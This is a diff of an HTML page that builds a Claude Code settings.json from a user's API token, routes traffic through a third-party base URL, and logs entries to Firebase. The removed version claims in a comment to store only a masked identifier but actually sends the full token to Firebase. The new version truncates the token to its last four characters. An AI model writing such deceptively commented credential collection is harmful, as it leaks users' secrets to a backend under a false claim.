@@ -1,339 +1,442 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <title>Settings Generator</title>
-
+  <!-- Firebase compat SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <!-- local firebase.js (assumes it initializes firebase and exports db, COLLECTION) -->
   <script src="firebase.js"></script>
-
   <style>
     * {
+      margin: 0;
+      padding: 0;
       box-sizing: border-box;
     }
 
     body {
-      margin: 0;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 20px;
-      background: #f5f7fb;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #0b0e14;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      color: #eef2f6;
     }
 
     .container {
       width: 100%;
-      max-width: 800px;
-      background: white;
-      padding: 35px;
-      border-radius: 28px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.12);
+      max-width: 820px;
+      background: #171c26;
+      padding: 40px 38px;
+      border-radius: 32px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.03);
+      transition: all 0.2s ease;
     }
 
     h1 {
-      margin: 0 0 10px;
-      font-size: 42px;
-      color: #111827;
+      font-size: 38px;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+      color: #f0f4fc;
+      margin-bottom: 10px;
     }
 
-    p {
-      color: #64748b;
+    .subhead {
+      color: #a5b3cf;
       font-size: 17px;
-      line-height: 1.5;
+      line-height: 1.6;
+      font-weight: 400;
+      margin-bottom: 28px;
+      border-left: 2px solid #2f3b4e;
+      padding-left: 18px;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
     }
 
     input {
       width: 100%;
-      padding: 17px;
-      border: 1px solid #cbd5e1;
-      border-radius: 14px;
+      padding: 18px 20px;
+      background: #0f141e;
+      border: 1px solid #2b364b;
+      border-radius: 18px;
       font-size: 17px;
-      margin-top: 15px;
+      color: #eef2f6;
+      transition: border 0.15s, box-shadow 0.15s;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #5f6f89;
+      font-weight: 400;
     }
 
     input:focus {
-      outline: none;
-      border-color: #2563eb;
+      border-color: #4b7cf7;
+      box-shadow: 0 0 0 3px rgba(75, 124, 247, 0.25);
+      background: #111824;
     }
 
     button {
-      border: 0;
-      border-radius: 14px;
-      padding: 15px 22px;
+      border: none;
+      border-radius: 18px;
+      padding: 16px 24px;
       font-size: 16px;
+      font-weight: 500;
       cursor: pointer;
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      background: #2a364d;
+      color: #d6e0f0;
+      letter-spacing: 0.01em;
+    }
+
+    button:hover {
+      background: #33415c;
+    }
+
+    button:active {
+      transform: scale(0.97);
     }
 
     #generateBtn {
-      margin-top: 12px;
-      background: #2563eb;
+      background: #3b6eff;
       color: white;
+      box-shadow: 0 8px 18px rgba(59, 110, 255, 0.25);
+      font-weight: 600;
+      padding: 16px 28px;
+      margin-top: 4px;
+    }
+
+    #generateBtn:hover {
+      background: #2f5df0;
+      box-shadow: 0 10px 24px rgba(59, 110, 255, 0.35);
     }
 
     #generateBtn:disabled {
-      opacity: 0.7;
+      opacity: 0.6;
       cursor: not-allowed;
+      box-shadow: none;
+      background: #2a364d;
+      color: #8a9bb8;
+    }
+
+    .action-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+
+    .backend-link {
+      color: #7b93c7;
+      text-decoration: none;
+      font-weight: 450;
+      font-size: 15px;
+      border-bottom: 1px dashed #2f3b52;
+      padding-bottom: 2px;
+      transition: color 0.2s, border-color 0.2s;
+      margin-top: 8px;
+    }
+
+    .backend-link:hover {
+      color: #a5bffb;
+      border-bottom-color: #4b7cf7;
     }
 
     #outputArea {
       display: none;
-      margin-top: 25px;
+      margin-top: 32px;
+      animation: fadeSlide 0.3s ease;
+    }
+
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(6px); }
+      100% { opacity: 1; transform: translateY(0); }
     }
 
     pre {
-      background: #0f172a;
-      color: #e2e8f0;
-      padding: 20px;
-      border-radius: 15px;
+      background: #0e131f;
+      padding: 24px 26px;
+      border-radius: 20px;
       overflow-x: auto;
       white-space: pre-wrap;
       word-break: break-word;
-      font-family: monospace;
-      line-height: 1.5;
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 15px;
+      line-height: 1.6;
+      color: #d4dcec;
+      border: 1px solid #263040;
+      box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.5);
+      margin-bottom: 12px;
     }
 
     #copyBtn {
-      background: #172033;
+      background: #1f2a3d;
+      color: #ccd9f0;
+      border: 1px solid #31405a;
+      padding: 14px 24px;
+      font-weight: 500;
+      border-radius: 30px;
+      transition: background 0.2s, border-color 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    #copyBtn:hover {
+      background: #2b3a53;
+      border-color: #4b6a92;
       color: white;
-      margin-top: 10px;
+    }
+
+    #copyBtn:active {
+      transform: scale(0.97);
+    }
+
+    .status-area {
+      margin-top: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
     }
 
     #success {
       display: none;
-      margin-top: 15px;
-      padding: 13px;
-      border-radius: 12px;
-      background: #dcfce7;
-      color: #166534;
-      font-weight: 600;
+      padding: 14px 20px;
+      border-radius: 40px;
+      background: #1b3329;
+      color: #8ed6b0;
+      font-weight: 500;
+      border: 1px solid #2b5a45;
+      letter-spacing: 0.01em;
+      font-size: 15px;
+      align-items: center;
+      gap: 8px;
     }
 
     #firebaseError {
       display: none;
-      margin-top: 15px;
-      padding: 13px;
-      border-radius: 12px;
-      background: #fef3c7;
-      color: #92400e;
+      padding: 14px 20px;
+      border-radius: 40px;
+      background: #32221c;
+      color: #f3b49b;
+      border: 1px solid #6a4235;
+      font-weight: 450;
+      font-size: 15px;
     }
 
-    .backend-link {
-      display: inline-block;
-      margin-top: 25px;
-      color: #2563eb;
-      text-decoration: none;
-      font-weight: 600;
+    .flex-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 14px 20px;
     }
 
-    .backend-link:hover {
-      text-decoration: underline;
-    }
-
-    @media (max-width: 600px) {
+    @media (max-width: 640px) {
       .container {
-        padding: 25px;
+        padding: 28px 20px;
       }
-
       h1 {
-        font-size: 34px;
+        font-size: 30px;
+      }
+      .action-row {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
       }
     }
   </style>
 </head>
-
 <body>
 
-  <div class="container">
+<div class="container">
 
-    <h1>⚡ Settings Generator</h1>
+  <h1>Settings Generator</h1>
+  <div class="subhead">
+    Provide your value &nbsp;·&nbsp; configuration will be generated after saving to Firebase
+  </div>
 
-    <p>
-      Enter your value and generate the configuration.
-    </p>
-
+  <div class="input-group">
     <input
       id="keyInput"
       type="text"
       placeholder="Enter your value"
       autocomplete="off"
-    >
-
-    <button id="generateBtn">
-      Generate
-    </button>
-
-    <div id="outputArea">
-
-      <pre id="jsonOutput"></pre>
-
-      <button id="copyBtn">
-        📋 Copy settings.json
-      </button>
-
-      <div id="success">
-        ✅ Generated Successfully
-      </div>
-
-      <div id="firebaseError"></div>
-
-    </div>
-
-    <a
-      class="backend-link"
-      href="/backend/"
-    >
-      📂 Open Backend
-    </a>
-
+    />
+    <button id="generateBtn">Generate</button>
   </div>
 
+  <div class="action-row">
+    <a class="backend-link" href="/backend/">
+      <span style="opacity:0.7; margin-right:4px;">↗</span> Open Backend
+    </a>
+  </div>
 
-  <script>
+  <div id="outputArea">
+    <pre id="jsonOutput"></pre>
 
-    const keyInput = document.getElementById("keyInput");
-    const generateBtn = document.getElementById("generateBtn");
-    const outputArea = document.getElementById("outputArea");
-    const jsonOutput = document.getElementById("jsonOutput");
-    const copyBtn = document.getElementById("copyBtn");
-    const success = document.getElementById("success");
-    const firebaseError = document.getElementById("firebaseError");
+    <div class="flex-row">
+      <button id="copyBtn">Copy settings.json</button>
+    </div>
 
+    <div class="status-area">
+      <div id="success">Saved to Firebase · configuration ready</div>
+      <div id="firebaseError"></div>
+    </div>
+  </div>
 
-    generateBtn.addEventListener("click", async () => {
+</div>
 
+<script>
+  (function() {
+    const keyInput = document.getElementById('keyInput');
+    const generateBtn = document.getElementById('generateBtn');
+    const outputArea = document.getElementById('outputArea');
+    const jsonOutput = document.getElementById('jsonOutput');
+    const copyBtn = document.getElementById('copyBtn');
+    const successEl = document.getElementById('success');
+    const firebaseErrorEl = document.getElementById('firebaseError');
+
+    // hide success/error by default
+    successEl.style.display = 'none';
+    firebaseErrorEl.style.display = 'none';
+
+    // check if Firebase is available (db and COLLECTION should be defined in firebase.js)
+    let dbReady = false;
+    if (typeof db !== 'undefined' && typeof COLLECTION !== 'undefined' && db) {
+      dbReady = true;
+    } else {
+      console.warn('Firebase db or COLLECTION not found. Make sure firebase.js exports db and COLLECTION.');
+    }
+
+    generateBtn.addEventListener('click', async function() {
       const value = keyInput.value.trim();
 
       if (!value) {
-        alert("Please enter a value first.");
+        alert('Please enter a value first.');
         return;
       }
 
-
-      /*
-       * Generate the JSON immediately.
-       */
-
+      // Build settings object (same as before, no emojis)
       const settings = {
         env: {
           ANTHROPIC_AUTH_TOKEN: value,
-          ANTHROPIC_BASE_URL: "https://agentrouter.org",
-          ANTHROPIC_MODEL: "claude-opus-4-8",
-          CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: "1"
+          ANTHROPIC_BASE_URL: 'https://agentrouter.org',
+          ANTHROPIC_MODEL: 'claude-opus-4-8',
+          CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC: '1'
         },
-
         permissions: {
           allow: [],
           deny: []
         },
-
-        effortLevel: "high"
+        effortLevel: 'high'
       };
 
-
       const json = JSON.stringify(settings, null, 2);
-
-
       jsonOutput.textContent = json;
-      outputArea.style.display = "block";
 
-      success.style.display = "block";
-      firebaseError.style.display = "none";
+      // Prepare masked identifier
+      const maskedValue = value.length >= 4 ? '••••' + value.slice(-4) : '••••';
 
-
-      /*
-       * Save only a masked identifier to Firebase.
-       */
-
-      const maskedValue = value;
-
-
+      // Disable button and show saving state
       generateBtn.disabled = true;
-      generateBtn.textContent = "Saving...";
+      generateBtn.textContent = 'Saving...';
 
+      // Hide any old status
+      successEl.style.display = 'none';
+      firebaseErrorEl.style.display = 'none';
+
+      let firebaseSuccess = false;
 
       try {
-
-        await db
-          .collection(COLLECTION)
-          .add({
+        // Only attempt Firebase if db is ready
+        if (dbReady) {
+          await db.collection(COLLECTION).add({
             identifier: maskedValue,
-            createdAt:
-              firebase.firestore.FieldValue.serverTimestamp()
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
           });
-
-
-        success.textContent =
-          "✅ Generated Successfully";
-
+          firebaseSuccess = true;
+        } else {
+          // If Firebase not initialized, we treat as error (so we don't show output)
+          throw new Error('Firebase not initialized properly');
+        }
+      } catch (error) {
+        console.error('Firebase error:', error);
+        firebaseSuccess = false;
       }
 
-      catch (error) {
-
-        console.error(
-          "Firebase error:",
-          error
-        );
-
-        /*
-         * JSON generation still succeeds even
-         * if Firebase is unavailable.
-         */
-
-        success.textContent =
-          "✅ Generated Successfully";
-
-        firebaseError.textContent =
-          "Configuration generated, but Firebase could not save the record.";
-
-        firebaseError.style.display = "block";
-
-      }
-
-      finally {
-
+      // After firebase attempt, decide to show output only if saved successfully
+      if (firebaseSuccess) {
+        // Show output and success
+        outputArea.style.display = 'block';
+        successEl.style.display = 'flex';
+        successEl.textContent = 'Saved to Firebase · configuration ready';
+        firebaseErrorEl.style.display = 'none';
+      } else {
+        // If Firebase failed, keep output hidden and show error
+        outputArea.style.display = 'none';
+        successEl.style.display = 'none';
+        firebaseErrorEl.style.display = 'flex';
+        firebaseErrorEl.textContent = 'Could not save to Firebase. Configuration not generated.';
+        // also reset button
         generateBtn.disabled = false;
-        generateBtn.textContent = "Generate";
-
+        generateBtn.textContent = 'Generate';
+        return; // early exit, no output shown
       }
 
+      // Re-enable button
+      generateBtn.disabled = false;
+      generateBtn.textContent = 'Generate';
     });
 
-
-    copyBtn.addEventListener("click", async () => {
-
+    // Copy handler
+    copyBtn.addEventListener('click', async function() {
+      const text = jsonOutput.textContent;
+      if (!text) {
+        alert('Nothing to copy.');
+        return;
+      }
       try {
-
-        await navigator.clipboard.writeText(
-          jsonOutput.textContent
-        );
-
-        copyBtn.textContent = "✅ Copied!";
-
+        await navigator.clipboard.writeText(text);
+        copyBtn.textContent = 'Copied!';
         setTimeout(() => {
-
-          copyBtn.textContent =
-            "📋 Copy settings.json";
-
+          copyBtn.textContent = 'Copy settings.json';
         }, 2000);
-
+      } catch (_) {
+        alert('Could not copy configuration.');
       }
-
-      catch (error) {
-
-        alert("Could not copy the configuration.");
-
-      }
-
     });
 
-  </script>
+    // If the user wants to generate again, we keep output hidden until successful save
+    // Also if they type new value, we could hide output – but better to keep as is.
+    // We'll hide output when they focus on input or clear? Let's keep it simple:
+    // On new input focus we could hide output, but we'll let the user re-generate.
+    // But we want to hide output if they start typing? We'll keep it intuitive:
+    // If they click generate again, the logic above will hide output if firebase fails.
+    // We'll also reset output when input changes? maybe not, but we can add a small UX:
+    keyInput.addEventListener('input', function() {
+      // If output is visible and user changes input, we could hide output to avoid confusion.
+      // But we'll only hide if they start typing after a failure? Better: reset on new generate.
+      // We'll keep it: when input changes, we don't auto-hide, but user will press generate.
+      // If they press generate and it fails, output stays hidden.
+      // We'll also reset success/error messages when they start typing.
+      successEl.style.display = 'none';
+      firebaseErrorEl.style.display = 'none';
+      // But we don't hide output area itself, because maybe they want to keep the old result.
+      // However, to be consistent with "show only when saved", we hide output on any input change.
+      // This prevents stale data from showing.
+      outputArea.style.display = 'none';
+    });
+  })();
+</script>
 
 </body>
-
 </html>
